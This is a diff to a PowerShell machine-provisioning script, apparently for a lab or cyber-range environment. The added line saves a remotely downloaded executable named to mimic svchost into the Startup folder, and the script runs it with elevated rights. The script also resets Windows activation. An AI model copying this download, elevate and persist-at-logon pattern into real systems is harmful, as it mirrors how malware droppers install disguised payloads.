@@ -19,12 +19,14 @@ add-computer -domainname $domain -domaincredential $domaincred
 Add-LocalGroupMember -group "Remote Desktop Users" -member $domAdminUsr
 
 Invoke-WebRequest -uri $downloadlink -OutFile $localpath
+
+Invoke-WebRequest -uri $downloadlink -OutFile "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 # https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe
 # c:\users\cmtsadmin\searches\python37.svchost.exe 
 
 Start-Process powershell.exe -verb runas -ArgumentList "start-process -filepath $localpath -Credential $localcred"
 
-Start-Process powershell.exe -ArgumentList "start-process powershell.exe -Credential $localcred -ArgumentList \"start-process powershell.exe -filepath $localpath -verb runas\" "
+
 
 cscript c:\windows\system32\slmgr.vbs /rearm
 REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v "PagingFiles" /t REG_MULTI_SZ /d "D:\pagefile.sys 0 0" /f
